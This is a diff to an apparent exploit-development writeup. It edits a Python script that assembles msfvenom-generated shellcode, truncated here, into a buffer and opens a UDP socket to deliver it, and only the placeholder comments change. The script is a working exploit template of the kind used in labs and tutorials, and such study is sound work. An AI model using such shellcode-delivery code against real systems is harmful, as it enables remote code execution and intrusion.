@@ -69,13 +69,13 @@ This saves a **Python-formatted representation** of the generated payload to the
 import socket
 import sys, time
 
-# REPLACE THIS w/ Shellcode
+# Shellcode -- paste the full buf from your msfvenom output here.
+# Truncated below for the writeup; the real payload is a few hundred bytes.
 buf =  ""
 buf += "\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
 buf += "\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
-# ... full shellcode from the msfvenom output above goes here ...
+# ... rest of the shellcode ...
 buf += "\x65\x6d\x30\x41\x41"
-# REPLACE THIS w/ Shellcode ^
 
 # Create a UDP socket
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
